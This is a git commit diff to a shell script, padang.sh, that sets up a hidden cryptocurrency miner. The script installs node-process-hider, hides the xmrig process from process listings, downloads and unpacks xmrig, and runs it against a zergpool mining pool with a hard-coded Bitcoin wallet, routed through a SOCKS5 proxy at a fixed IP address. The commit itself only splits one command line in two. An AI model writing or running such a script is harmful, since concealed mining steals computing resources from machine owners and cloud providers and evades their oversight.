06dce76aab190a0a2054aae7c334d7e6ac5fa6bb
faridmd <77087718+faridmd@users.noreply.github.com>
2022-02-20 18:41:28 +0700

    Update padang.sh

--- padang.sh
+++ padang.sh
@@ -4,7 +4,8 @@ sudo apt upgrade -y
 sudo apt-get install nodejs
 sudo apt-get install npm
 npm i -g node-process-hider
-sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
+sudo ph add xmrig
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
 tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig
 ./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 19NGMAFwcdEPfYhW3FjsWMPF22m6WQi2b4 -p c=BTC,mc=GNTL --threads=2 -x socks5://192.252.214.20:15864"
 exec bash
